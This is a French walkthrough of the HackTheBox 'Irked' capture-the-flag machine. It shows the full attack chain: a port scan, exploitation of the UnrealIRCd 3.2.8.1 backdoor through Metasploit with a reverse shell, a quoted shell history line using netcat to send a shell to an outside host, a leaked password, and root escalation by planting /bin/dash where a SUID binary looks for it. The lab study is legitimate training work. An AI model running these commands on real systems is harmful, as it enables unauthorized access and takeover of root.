# Solution du CTF Irked de HackTheBox

Fast
----

*Irked* est un CTF proposé par *MrAgent* sur *HackTheBox*.  

Platforme Linux et difficulté facile (20 points), c'est parti !  

La machine dispose de ports ouverts classiques mais aussi certains en rapport avec IRC :  

```plain
Nmap scan report for 10.10.10.117
Host is up (0.029s latency).
Not shown: 65513 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
111/tcp   open     rpcbind
142/tcp   filtered bl-idm
2092/tcp  filtered descent3
3663/tcp  filtered dtp
6697/tcp  open     ircs-u
7634/tcp  filtered hddtemp
8067/tcp  open     infi-async
8512/tcp  filtered unknown
10572/tcp filtered unknown
15124/tcp filtered unknown
16477/tcp filtered unknown
22681/tcp filtered unknown
29675/tcp filtered unknown
29926/tcp filtered unknown
46360/tcp filtered unknown
48368/tcp filtered unknown
48810/tcp filtered unknown
49419/tcp open     unknown
52182/tcp filtered unknown
65534/tcp open     unknown
```

Le serveur web ne retournant rien d'intéressant c'est le moment de lancer le client IRC XChat pour voir ce que l'on trouve :  

```plain
* *** Looking up your hostname...
* *** Couldn't resolve your hostname; using your IP address instead
* You have not registered
* Welcome to the ROXnet IRC Network devloop!devloop@10.10.13.166
* Your host is irked.htb, running version Unreal3.2.8.1
* This server was created Mon May 14 2018 at 13:12:50 EDT
* irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
* UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
* WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
* EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
* There are 1 users and 2 invisible on 1 servers
* I have 3 clients and 0 servers
* Current Local Users: 3  Max: 3
* Current Global Users: 3  Max: 3
* MOTD File is missing
* devloop active le mode +i devloop
* devloop active le mode +w devloop
* devloop active le mode +x devloop
```

On voit ici que le serveur IRCd est un Unread en version 3.2.8.1, bien connu pour inclure une backdoor ([voir solution du CTF Relativity](http://devloop.users.sourceforge.net/index.php?article71/solution-du-ctf-relativity)).  

*Metasploit* dispose d'un module pour cette vulnérabilité, il suffit juste de tester quelques payloads pour en trouver un fonctionnel :  

```plain
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  10.10.10.117     yes       The target address
   RPORT  6697             yes       The target port (TCP)

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.13.166     yes       The listen address (an interface may be specified)
   LPORT  80               yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP handler on 10.10.13.166:80
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.13.166:80 -> 10.10.10.117:33984) at 2019-02-03 12:07:42 +0100

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

Le système est un Debian 32 bits (*Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux*).  

Il y a un utilisateur qui possède le flag *user.txt* :  

```plain
1061877    4 drwxr-xr-x  18 djmardov djmardov     4096 Nov  3 04:40 /home/djmardov
1177472    4 drwx------   3 djmardov djmardov     4096 May 11  2018 /home/djmardov/.dbus
1061885    4 -rw-r--r--   1 djmardov djmardov      675 May 11  2018 /home/djmardov/.profile
1062684    0 lrwxrwxrwx   1 root     root            9 Nov  3 04:26 /home/djmardov/.bash_history -> /dev/null
1177702    4 drwx------   2 djmardov djmardov     4096 May 11  2018 /home/djmardov/.ssh
1061894    4 drwxr-xr-x   2 djmardov djmardov     4096 May 14  2018 /home/djmardov/Downloads
1177456    4 drwxr-xr-x   2 djmardov djmardov     4096 May 15  2018 /home/djmardov/Documents
1177813    4 -rw-------   1 djmardov djmardov       33 May 15  2018 /home/djmardov/Documents/user.txt
1177807    4 -rw-r--r--   1 djmardov djmardov       52 May 16  2018 /home/djmardov/Documents/.backup
1177703    4 drwx------   2 djmardov djmardov     4096 May 15  2018 /home/djmardov/.gnupg
1061893    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 /home/djmardov/Desktop
1177523    4 drwx------  13 djmardov djmardov     4096 May 15  2018 /home/djmardov/.cache
1177487    4 drwx------   3 djmardov djmardov     4096 Nov  3 04:40 /home/djmardov/.gconf
1177477    4 drwx------   3 djmardov djmardov     4096 May 11  2018 /home/djmardov/.local
1061897    8 -rw-------   1 djmardov djmardov     4706 Nov  3 04:40 /home/djmardov/.ICEauthority
1177457    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 /home/djmardov/Music
1177455    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 /home/djmardov/Public
1177467    4 drwx------  15 djmardov djmardov     4096 May 15  2018 /home/djmardov/.config
1061886    4 -rw-r--r--   1 djmardov djmardov      220 May 11  2018 /home/djmardov/.bash_logout
1061887    4 -rw-r--r--   1 djmardov djmardov     3515 May 11  2018 /home/djmardov/.bashrc
1177466    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 /home/djmardov/Videos
1177458    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 /home/djmardov/Pictures
1061895    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 /home/djmardov/Templates
1177582    4 drwx------   4 djmardov djmardov     4096 May 11  2018 /home/djmardov/.mozilla
```

Le fichier *Documents/.backup* contient un mot de passe avec un indice laissant supposer qu'il faut utiliser un logiciel de stéganographie quelconque... pas trop envie XD  

And furious
-----------

Le fichier */home/ircd/.bash\_history* semble contenir des commandes de plus fort intérêt :  

```bash
echo '#!/bin/sh' > who
echo 'nc 10.10.13.255 4445 -e /bin/sh' >> who
chmod +x who
./who
/usr/bin/viewuser
su
su Kab6h+m+bbp2J
su
viewuser
exit
```

Malheureusement ce qui semble être un mot de passe ne semble pas permettre un accès SSH ni de passer root via *su* :(  

Le binaire *viewuser* semble être le chemin tout tracé :  

```plain
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
```

Une fois ce binaire récupéré on l'ouvre dans *Cutter* pour voir le *main()* :  

![HackTheBox Irked CTF viewuser disassembly in Cutter](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/irked_viewuser_main.png)

Et parmi les chaînes de caractères présentes dans le programme on voit */tmp/listusers* qui n'existe pas...  

```plain
ircd@irked:/var/www/html$ cp /bin/dash /tmp/listusers
ircd@irked:/var/www/html$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-02-03 08:08 (:0)
djmardov pts/2        2019-02-03 08:10 (10.10.14.226)
djmardov pts/0        2019-02-03 08:24 (10.10.14.13)
djmardov pts/8        2019-02-03 08:44 (10.10.12.244)
djmardov pts/10       2019-02-03 08:50 (10.10.15.100)
# id
uid=0(root) gid=1001(ircd) groups=1001(ircd)
# cd /root
# ls
pass.txt  root.txt
# cat root.txt
8d8e9e8 -- snip --22daf3
```


*Published April 27 2019 at 17:44*